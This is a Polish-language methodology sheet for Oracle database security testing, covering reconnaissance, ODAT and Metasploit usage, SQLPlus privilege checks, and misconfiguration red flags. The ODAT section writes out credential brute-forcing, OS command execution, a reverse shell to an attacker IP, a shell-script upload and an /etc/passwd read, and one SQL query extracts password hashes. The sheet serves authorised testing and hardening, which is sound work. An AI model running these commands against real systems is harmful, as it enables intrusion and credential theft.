# Testowanie bezpieczeństwa bazy danych Oracle

---

## Rekonesans — skanowanie portów i odkrywanie SID

```bash
# Skanowanie portów Oracle
nmap -sV -p 1521,1522,1525 <host>

# Brute-force SID przez NSE
nmap --script oracle-sid-brute -p 1521 <host>

# Enumeracja użytkowników
nmap --script oracle-enum-users \
  --script-args oracle-enum-users.sid=ORCL,userdb=/usr/share/nmap/nselib/data/oracle-default-accounts.lst \
  -p 1521 <host>
```

---

## ODAT — Oracle Database Attacking Tool

Repozytorium: https://github.com/quentinhardy/odat

Instalacja: `apt install odat` (Kali) lub `git clone` + zależności pip.

```bash
# Odkrywanie SID
./odat.py sidguesser -s <host> -p 1521

# Brute-force poświadczeń (wymaga poprawnego SID)
./odat.py passwordguesser -s <host> -p 1521 -d ORCL \
  --accounts-file accounts/oracle_accounts.txt

# Sprawdzenie uprawnień bieżącego użytkownika
./odat.py all -s <host> -p 1521 -d ORCL -U <user> -P <password>

# Wykonanie polecenia OS (jeśli DBMS_SCHEDULER dostępny)
./odat.py dbmsscheduler -s <host> -p 1521 -d ORCL \
  -U <user> -P <password> --exec /bin/id

# Reverse shell
./odat.py dbmsscheduler -s <host> -p 1521 -d ORCL \
  -U <user> -P <password> --reverse-shell <attacker-ip> 4444

# Upload pliku na serwer
./odat.py utlfile -s <host> -p 1521 -d ORCL \
  -U <user> -P <password> --putFile /tmp shell.sh ./shell.sh

# Odczyt pliku z serwera
./odat.py utlfile -s <host> -p 1521 -d ORCL \
  -U <user> -P <password> --getFile /etc/passwd passwd.txt
```

---

## Ręczne sprawdzenia SQLPlus

### Połączenie

```bash
sqlplus <user>/<password>@<host>:1521/<SID>
sqlplus <user>/<password>@<host>:1521/<SID> as sysdba
```

### Bieżący użytkownik i uprawnienia

```sql
SELECT USER FROM DUAL;
SELECT * FROM SESSION_PRIVS;
SELECT * FROM USER_SYS_PRIVS;
SELECT * FROM DBA_SYS_PRIVS WHERE GRANTEE = USER;
```

### Role

```sql
SELECT * FROM SESSION_ROLES;
```

### Lista użytkowników (wymaga DBA)

```sql
SELECT USERNAME, ACCOUNT_STATUS, PASSWORD_VERSIONS FROM DBA_USERS;
```

### Hashe haseł

```sql
SELECT USERNAME, PASSWORD FROM SYS.USER$ WHERE PASSWORD IS NOT NULL;
```

### Domyślne / słabe poświadczenia

```sql
-- Sprawdź czy domyślne konta są aktywne
SELECT USERNAME, ACCOUNT_STATUS FROM DBA_USERS
  WHERE USERNAME IN ('SYS','SYSTEM','SCOTT','DBSNMP','OUTLN','SYSMAN','MDSYS');
```

### Uprawnienia PUBLIC (niebezpieczne)

```sql
-- Pakiety dostępne dla wszystkich użytkowników
SELECT TABLE_NAME, PRIVILEGE FROM DBA_TAB_PRIVS
  WHERE GRANTEE = 'PUBLIC' AND PRIVILEGE = 'EXECUTE'
  ORDER BY TABLE_NAME;

-- Dostęp do UTL_FILE / UTL_HTTP (szczególnie groźne)
SELECT * FROM DBA_TAB_PRIVS
  WHERE TABLE_NAME IN ('UTL_FILE','UTL_HTTP','UTL_TCP')
  AND GRANTEE = 'PUBLIC';
```

### Audyt

```sql
-- Czy audyt jest włączony?
SELECT VALUE FROM V$PARAMETER WHERE NAME = 'audit_trail';
-- BAD: NONE
-- GOOD: DB, OS, XML, DB_EXTENDED
```

---

## Moduły Metasploit dla Oracle

```
use auxiliary/scanner/oracle/oracle_login
use auxiliary/admin/oracle/exec
use auxiliary/admin/oracle/sql
use auxiliary/scanner/oracle/sid_brute
```

---

## DBSAT — narzędzie oceny Oracle

Download: https://www.oracle.com/security/database-security/assessment-tool/

```bash
# Uruchomienie kolektora (na serwerze DB)
./dbsat collect <db_user>/<password>@<host>:<port>/<SID> dbsat_report

# Generowanie raportu (HTML/CSV/Excel)
./dbsat report dbsat_report
```

Sprawdza: zgodność z CIS Benchmark, DISA STIG, poziom łatek, uprawnienia użytkowników, konfiguracja audytu, status szyfrowania.

---

## Wskaźniki błędnej konfiguracji

- Domyślne konta aktywne: `SCOTT/TIGER`, `SYSTEM/MANAGER`, `SYS/CHANGE_ON_INSTALL`
- `PUBLIC` ma `EXECUTE` na `UTL_FILE`, `UTL_HTTP`, `UTL_TCP`
- `audit_trail = NONE`
- `SQLNET.ENCRYPTION_CLIENT = REQUESTED` (zamiast `REQUIRED`)
- Aplikacja łączy się jako DBA/SYSDBA zamiast użytkownika z minimalnymi uprawnieniami
- Hashe haseł używają starego algorytmu (DES) zamiast SHA-512

---

## Red flags

- Konta domyślne (`SCOTT`, `DBSNMP`, `OUTLN`) w statusie `OPEN`
- `PUBLIC` z prawem `EXECUTE` na pakietach systemowych (`UTL_FILE`, `UTL_HTTP`, `DBMS_SCHEDULER`)
- `audit_trail = NONE` — brak jakiegokolwiek audytu
- Aplikacja łączy się na konto `SYS` lub `SYSTEM` zamiast dedykowanego użytkownika
- Hasła użytkowników w formacie DES (kolumna `PASSWORD_VERSIONS` zawiera tylko `10G`)
- Port 1521 dostępny bez filtrowania z sieci użytkownika
- SID odgadnięty przez `nmap --script oracle-sid-brute` w ciągu sekund
